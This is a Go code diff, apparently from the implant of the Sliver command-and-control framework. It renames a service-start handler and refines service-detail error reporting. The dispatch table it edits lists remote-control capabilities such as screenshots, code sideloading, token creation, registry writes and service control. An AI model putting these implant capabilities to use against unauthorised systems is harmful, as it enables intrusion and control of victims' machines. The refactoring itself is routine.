@@ -75,22 +75,22 @@ var (
 		sliverpb.MsgCurrentTokenOwnerReq:           currentTokenOwnerHandler,
 
 		// Platform specific
-		sliverpb.MsgIfconfigReq:             ifconfigHandler,
-		sliverpb.MsgScreenshotReq:           screenshotHandler,
-		sliverpb.MsgSideloadReq:             sideloadHandler,
-		sliverpb.MsgNetstatReq:              netstatHandler,
-		sliverpb.MsgMakeTokenReq:            makeTokenHandler,
-		sliverpb.MsgPsReq:                   psHandler,
-		sliverpb.MsgTerminateReq:            terminateHandler,
-		sliverpb.MsgRegistryReadReq:         regReadHandler,
-		sliverpb.MsgRegistryWriteReq:        regWriteHandler,
-		sliverpb.MsgRegistryCreateKeyReq:    regCreateKeyHandler,
-		sliverpb.MsgRegistryDeleteKeyReq:    regDeleteKeyHandler,
-		sliverpb.MsgRegistrySubKeysListReq:  regSubKeysListHandler,
-		sliverpb.MsgRegistryListValuesReq:   regValuesListHandler,
-		sliverpb.MsgServicesReq:             servicesListHandler,
-		sliverpb.MsgServiceDetailReq:        serviceDetailHandler,
-		sliverpb.MsgStartExistingServiceReq: startExistingServiceHandler,
+		sliverpb.MsgIfconfigReq:            ifconfigHandler,
+		sliverpb.MsgScreenshotReq:          screenshotHandler,
+		sliverpb.MsgSideloadReq:            sideloadHandler,
+		sliverpb.MsgNetstatReq:             netstatHandler,
+		sliverpb.MsgMakeTokenReq:           makeTokenHandler,
+		sliverpb.MsgPsReq:                  psHandler,
+		sliverpb.MsgTerminateReq:           terminateHandler,
+		sliverpb.MsgRegistryReadReq:        regReadHandler,
+		sliverpb.MsgRegistryWriteReq:       regWriteHandler,
+		sliverpb.MsgRegistryCreateKeyReq:   regCreateKeyHandler,
+		sliverpb.MsgRegistryDeleteKeyReq:   regDeleteKeyHandler,
+		sliverpb.MsgRegistrySubKeysListReq: regSubKeysListHandler,
+		sliverpb.MsgRegistryListValuesReq:  regValuesListHandler,
+		sliverpb.MsgServicesReq:            servicesListHandler,
+		sliverpb.MsgServiceDetailReq:       serviceDetailHandler,
+		sliverpb.MsgStartServiceByNameReq:  startServiceByNameHandler,
 
 		// Generic
 		sliverpb.MsgPing:           pingHandler,
@@ -598,14 +598,14 @@ func stopService(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
-func startExistingServiceHandler(data []byte, resp RPCResponse) {
-	startServiceReq := &sliverpb.StartExistingServiceReq{}
+func startServiceByNameHandler(data []byte, resp RPCResponse) {
+	startServiceReq := &sliverpb.StartServiceByNameReq{}
 	err := proto.Unmarshal(data, startServiceReq)
 	if err != nil {
 		return
 	}
 
-	err = service.StartExistingService(startServiceReq.ServiceInfo.Hostname, startServiceReq.ServiceInfo.ServiceName)
+	err = service.StartServiceByName(startServiceReq.ServiceInfo.Hostname, startServiceReq.ServiceInfo.ServiceName)
 	svcInfo := &sliverpb.ServiceInfo{}
 	if err != nil {
 		svcInfo.Response = &commonpb.Response{
@@ -837,7 +837,12 @@ func serviceDetailHandler(data []byte, resp RPCResponse) {
 		Response: &commonpb.Response{},
 	}
 	if err != nil {
-		serviceDetailResp.Response.Err = err.Error()
+		if serviceDetail != nil {
+			// Then we had a non-fatal error
+			serviceDetailResp.Message = err.Error()
+		} else {
+			serviceDetailResp.Response.Err = err.Error()
+		}
 	}
 
 	data, err = proto.Marshal(serviceDetailResp)
